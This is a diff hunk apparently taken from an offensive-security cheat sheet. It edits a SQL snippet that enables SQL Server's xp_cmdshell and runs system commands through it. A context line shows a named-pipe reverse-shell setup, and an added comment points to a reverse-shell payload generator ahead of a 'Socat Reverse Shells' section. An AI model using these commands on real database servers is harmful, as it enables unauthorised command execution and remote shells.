@@ -1201,10 +1201,10 @@ mknod /tmp/backpipe p
 ```sql
 EXEC sp_configure 'Show Advanced Options', 1;
 reconfigure;
-sp_configure;
 EXEC sp_configure 'xp_cmdshell', 1
 reconfigure;
-xp_cmdshell 'whoami'
+exec xp_cmdshell 'whoami'
+# https://www.revshells.com/ powershell base64
 ```
 
 ### Socat Reverse Shells
